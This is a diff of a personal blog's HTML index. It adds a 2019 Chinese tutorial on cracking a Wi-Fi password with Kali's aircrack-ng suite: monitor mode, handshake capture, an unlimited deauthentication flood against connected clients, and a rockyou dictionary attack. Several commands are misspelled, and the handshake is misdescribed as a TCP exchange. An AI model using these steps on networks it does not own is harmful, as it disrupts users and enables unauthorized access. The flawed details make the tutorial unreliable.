@@ -156,6 +156,78 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-kali-暴力破解WiFi密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/30/kali-暴力破解WiFi密码/">kali暴力破解WiFi密码</a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/30/kali-暴力破解WiFi密码/" class="archive-article-date">
+  	<time datetime="2019-08-30T01:04:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#kali暴力破解WiFi密码</p>
+<p>我这里是用的虚拟机，在虚拟机里，无法用笔记本电脑自带的无线网卡（虚拟机里的系统只能用USB外接无线网卡），因此专门买了一个无线网卡<br>首先在终端里执行<br>      airmon-ngcheck kill// 杀死一切干扰无线网卡监听热点的信号</p>
+<p>然后载入自已的网卡名，一般都为wlan0<br>     airmon-ng start wlan0 </p>
+<p>激活无线网卡，此时无线网卡的名称将变为wlan0mon,之前为wlan0<br>     ifconfig -a<br>开始监听周围WiFi热点，显示各个WiFi热点<br>     airdump-ng wlan0mon</p>
+<p>接着选择一个目标，开始攻击<br>     airodump-ng -c 频道(ch) –bssid bssid -w /root/hh（用来存储抓包的目录）网卡名（wlan0mon）</p>
+<p>当用户与wifi路由器产生数据交换，发送握手包时，我们可以捕获到，但有时长时间用户不与wifi路由器进行交互，不产生握手包，这时，我们可以强制断开用户的wifi，破事用户重新连接，这时就会产生握手包，新建一个终端<br>     airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon）</p>
+<p>(0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码)</p>
+<p>最后使用aircrack-ng进行破解<br>     aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hh-0.1.cap</p>
+<p>/usr/share/wordlists/rockyou.txt这个是所用密码字典的路径和文件名<br>/root/hh-0.1.cap这个是我们所捕获的握手包的路径和文件名</p>
+<p>参考文章：<a href="https://blog.csdn.net/qq_41203799/article/details/79945133" target="_blank" rel="noopener">https://blog.csdn.net/qq_41203799/article/details/79945133</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/30/kali-暴力破解WiFi密码/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -803,71 +875,6 @@ sudo pip install --upgrade pwntools  -i http://pypi.douban.com/simple --trusted-
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/07/19/drops夏令营12/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/15/test/">test</a>
-    </h1>
-  
-
-        
-        <a href="/2019/06/15/test/" class="archive-article-date">
-  	<time datetime="2019-06-14T16:41:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <img src="/2019/06/15/test/ada.jpg" title="this is a simple image">
-<a href="/2019/06/15/test/ada.jpg" title="哈哈">哈哈</a>
-<p><img src="//yoursite.com/2019/06/15/test/ada.jpg" alt></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/06/15/test/">展开全文 >></a>
         </p>
       
 
